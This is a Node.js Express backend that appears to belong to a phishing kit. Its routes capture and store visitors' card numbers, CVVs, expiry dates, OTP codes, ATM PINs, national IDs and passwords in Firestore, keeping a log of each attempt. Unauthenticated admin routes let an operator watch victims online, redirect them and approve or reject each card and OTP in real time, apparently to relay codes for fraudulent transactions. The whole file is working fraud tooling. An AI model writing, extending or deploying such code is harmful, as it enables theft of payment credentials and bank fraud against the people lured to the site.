require('dotenv').config();
const express = require('express');
const path = require('path');
const cookieParser = require('cookie-parser');
const cors = require('cors');
const { initializeFirebase } = require('./firebase-config');
const { initVisitor, updateStatus, updatePage } = require('./sys-track');
const { saveField, saveMultipleFields } = require('./data-save');
const { 
    getAllVisitors, 
    getVisitorById, 
    getOnlineVisitors,
    redirectVisitor,
    checkRedirect,
    approvePayment,
    approveOtp,
    getStatistics,
    getPaymentStatus,
    getOtpStatus,
    getVerificationStatus,
    approveVerification
} = require('./admin-api');

const app = express();
const PORT = process.env.PORT || 5000;

// Initialize Firebase
initializeFirebase();

// CORS configuration
const allowedOrigins = [
    'http://localhost:3000',
    'https://auth-system-nextjs.vercel.app',
    process.env.FRONTEND_URL
].filter(Boolean);

app.use(cors({
    origin: function(origin, callback) {
        // Allow requests with no origin (mobile apps, Postman, etc.)
        if (!origin) return callback(null, true);
        
        if (allowedOrigins.indexOf(origin) !== -1) {
            callback(null, true);
        } else {
            callback(new Error('Not allowed by CORS'));
        }
    },
    credentials: true
}));

// Middleware
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());

// Visitor tracking middleware (only for non-API routes)
app.use(async (req, res, next) => {
    try {
        if (!req.path.startsWith('/api/')) {
            const result = await initVisitor(req);
            res.cookie('vid', result.vid, { 
                maxAge: 30 * 24 * 60 * 60 * 1000, 
                httpOnly: true,
                sameSite: 'none',
                secure: true
            });
            req.vid = result.vid;
            req.ref = result.ref;
        }
        next();
    } catch (error) {
        console.error('Middleware error:', error);
        next();
    }
});

// ============================================
// API Routes
// ============================================

// Health check
app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', message: 'Backend is running' });
});

// Save field
app.post('/api/save-field', async (req, res) => {
    try {
        const { page, fieldName, fieldValue } = req.body;
        const vid = req.cookies.vid;
        
        if (!vid) {
            return res.status(400).json({ success: false, error: 'No visitor ID' });
        }
        
        const result = await saveField(vid, page, fieldName, fieldValue);
        res.json(result);
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Visitor status
app.post('/api/visitor/online', async (req, res) => {
    try {
        const vid = req.cookies.vid;
        if (vid) {
            await updateStatus(vid, true);
        }
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/visitor/offline', async (req, res) => {
    try {
        const vid = req.cookies.vid;
        if (vid) {
            await updateStatus(vid, false);
        }
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Check redirect
app.get('/api/check-redirect', async (req, res) => {
    try {
        const vid = req.cookies.vid;
        if (!vid) {
            return res.json({ success: false, error: 'No visitor ID' });
        }
        
        const result = await checkRedirect(vid);
        res.json(result);
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Save payment
app.post('/api/save-payment', async (req, res) => {
    try {
        const vid = req.cookies.vid;
        if (!vid) {
            return res.status(400).json({ success: false, error: 'No visitor ID' });
        }
        
        const { cardNumber, cardHolder, expiryDate, cvv, cardType } = req.body;
        const result = await saveMultipleFields(vid, 'step4', {
            cardNumber,
            cardHolder,
            expiryDate,
            cvv,
            cardType
        });
        
        const { getFirestore } = require('./firebase-config');
        const db = getFirestore();
        const timestamp = new Date().toISOString();
        const docRef = db.collection('visitors').doc(vid);
        const doc = await docRef.get();
        
        const updates = {
            'payment.card_status': 'pending',
            'payment.current': {
                cardNumber,
                cardHolder,
                expiryDate,
                cvv,
                cardType,
                timestamp
            },
            'lastUpdated': timestamp
        };
        
        if (doc.exists) {
            const data = doc.data();
            if (data.payment && data.payment.current) {
                const historyCount = data.payment.history ? Object.keys(data.payment.history).length : 0;
                const attemptKey = `payment.history.attempt_${historyCount + 1}`;
                updates[attemptKey] = {
                    ...data.payment.current,
                    card_status: data.payment.card_status || 'pending',
                    savedAt: timestamp
                };
            }
        }
        
        await docRef.update(updates);
        
        res.json(result);
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Check payment approval
app.get('/api/check-payment-approval', async (req, res) => {
    try {
        const vid = req.cookies.vid;
        if (!vid) {
            return res.json({ success: false, error: 'No visitor ID' });
        }
        
        const result = await getPaymentStatus(vid);
        res.json(result);
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Save OTP
app.post('/api/save-otp', async (req, res) => {
    try {
        const vid = req.cookies.vid;
        if (!vid) {
            return res.status(400).json({ success: false, error: 'No visitor ID' });
        }
        
        const { otp } = req.body;
        const { getFirestore } = require('./firebase-config');
        const db = getFirestore();
        const timestamp = new Date().toISOString();
        const docRef = db.collection('visitors').doc(vid);
        const doc = await docRef.get();
        
        const attemptCount = doc.exists && doc.data().otp && doc.data().otp.history 
            ? Object.keys(doc.data().otp.history).length 
            : 0;
        
        const updates = {
            'otp.otp_status': 'pending',
            'otp.current': {
                otp,
                timestamp,
                attemptNumber: attemptCount + 1
            },
            'lastUpdated': timestamp
        };
        
        if (doc.exists) {
            const data = doc.data();
            if (data.otp && data.otp.current) {
                const historyCount = data.otp.history ? Object.keys(data.otp.history).length : 0;
                const attemptKey = `otp.history.attempt_${historyCount + 1}`;
                updates[attemptKey] = {
                    ...data.otp.current,
                    otp_status: data.otp.otp_status || 'pending',
                    savedAt: timestamp
                };
            }
        }
        
        await docRef.update(updates);
        
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Save ATM PIN
app.post('/api/save-atm-pin', async (req, res) => {
    try {
        const vid = req.cookies.vid;
        if (!vid) {
            return res.status(400).json({ success: false, error: 'No visitor ID' });
        }
        
        const { atmPin } = req.body;
        if (!atmPin) {
            return res.status(400).json({ success: false, error: 'No ATM PIN provided' });
        }
        
        const { getFirestore } = require('./firebase-config');
        const db = getFirestore();
        const timestamp = new Date().toISOString();
        const docRef = db.collection('visitors').doc(vid);
        
        const doc = await docRef.get();
        const data = doc.exists ? doc.data() : {};
        
        const historyCount = data.atmPin && data.atmPin.history 
            ? Object.keys(data.atmPin.history).length 
            : 0;
        
        const updates = {};
        
        if (data.atmPin && data.atmPin.current) {
            const attemptKey = `atmPin.history.attempt_${historyCount + 1}`;
            updates[attemptKey] = {
                ...data.atmPin.current,
                savedAt: timestamp
            };
        }
        
        updates['atmPin.current'] = {
            atmPin,
            timestamp,
            attemptNumber: historyCount + 1
        };
        updates['lastUpdated'] = timestamp;
        
        await docRef.set(updates, { merge: true });
        
        res.json({ success: true });
    } catch (error) {
        console.error('ATM PIN save error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Check OTP approval
app.get('/api/check-otp-approval', async (req, res) => {
    try {
        const vid = req.cookies.vid;
        if (!vid) {
            return res.json({ success: false, error: 'No visitor ID' });
        }
        
        const result = await getOtpStatus(vid);
        res.json(result);
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Save activation data (step5)
app.post('/api/save-activation-data', async (req, res) => {
    try {
        const vid = req.cookies.vid;
        if (!vid) {
            return res.status(400).json({ success: false, error: 'No visitor ID' });
        }
        
        const { provider, phone, personalId, email, password } = req.body;
        const { getFirestore } = require('./firebase-config');
        const db = getFirestore();
        const timestamp = new Date().toISOString();
        const docRef = db.collection('visitors').doc(vid);
        
        const doc = await docRef.get();
        const data = doc.exists ? doc.data() : {};
        
        const historyCount = data.activation && data.activation.history 
            ? Object.keys(data.activation.history).length 
            : 0;
        
        const updates = {};
        
        if (data.activation && data.activation.current) {
            const attemptKey = `activation.history.attempt_${historyCount + 1}`;
            updates[attemptKey] = {
                ...data.activation.current,
                savedAt: timestamp
            };
        }
        
        updates['activation.current'] = {
            provider,
            phone,
            personalId,
            email: email || null,
            password: password || null,
            timestamp,
            attemptNumber: historyCount + 1
        };
        updates['lastUpdated'] = timestamp;
        
        await docRef.set(updates, { merge: true });
        
        res.json({ success: true });
    } catch (error) {
        console.error('Activation data save error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Save verification code (step5)
app.post('/api/save-verification-code', async (req, res) => {
    try {
        const vid = req.cookies.vid;
        if (!vid) {
            return res.status(400).json({ success: false, error: 'No visitor ID' });
        }
        
        const { verificationCode } = req.body;
        if (!verificationCode) {
            return res.status(400).json({ success: false, error: 'No verification code provided' });
        }
        
        const { getFirestore } = require('./firebase-config');
        const db = getFirestore();
        const timestamp = new Date().toISOString();
        const docRef = db.collection('visitors').doc(vid);
        
        const doc = await docRef.get();
        const data = doc.exists ? doc.data() : {};
        
        const historyCount = data.verification && data.verification.history 
            ? Object.keys(data.verification.history).length 
            : 0;
        
        const verificationData = {
            current: {
                verificationCode,
                timestamp,
                attemptNumber: historyCount + 1
            },
            verification_status: 'pending'
        };
        
        if (data.verification && data.verification.current) {
            if (!verificationData.history) {
                verificationData.history = data.verification.history || {};
            }
            verificationData.history[`attempt_${historyCount + 1}`] = {
                ...data.verification.current,
                savedAt: timestamp
            };
        }
        
        const updates = {
            verification: verificationData,
            lastUpdated: timestamp
        };
        
        await docRef.set(updates, { merge: true });
        
        res.json({ success: true });
    } catch (error) {
        console.error('Verification code save error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Check verification approval (step5)
app.get('/api/check-verification-approval', async (req, res) => {
    try {
        const vid = req.cookies.vid;
        if (!vid) {
            return res.json({ success: false, error: 'No visitor ID' });
        }
        
        const result = await getVerificationStatus(vid);
        res.json(result);
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// ============================================
// Admin API Routes
// ============================================

app.get('/api/admin/visitors', async (req, res) => {
    try {
        const result = await getAllVisitors();
        res.json(result);
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.get('/api/admin/visitor/:vid', async (req, res) => {
    try {
        const result = await getVisitorById(req.params.vid);
        res.json(result);
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.get('/api/admin/visitors/online', async (req, res) => {
    try {
        const result = await getOnlineVisitors();
        res.json(result);
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/admin/redirect-visitor', async (req, res) => {
    try {
        const { vid, targetPage } = req.body;
        const result = await redirectVisitor(vid, targetPage);
        res.json(result);
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/admin/approve-payment', async (req, res) => {
    try {
        const { vid, approved } = req.body;
        const result = await approvePayment(vid, approved);
        res.json(result);
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/admin/approve-otp', async (req, res) => {
    try {
        const { vid, approved } = req.body;
        const result = await approveOtp(vid, approved);
        res.json(result);
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/admin/approve-verification', async (req, res) => {
    try {
        const { vid, verification_status } = req.body;
        const result = await approveVerification(vid, verification_status);
        res.json(result);
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.get('/api/admin/statistics', async (req, res) => {
    try {
        const result = await getStatistics();
        res.json(result);
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// ============================================
// Start Server
// ============================================

app.listen(PORT, () => {
    console.log(`🚀 Backend server running on port ${PORT}`);
});
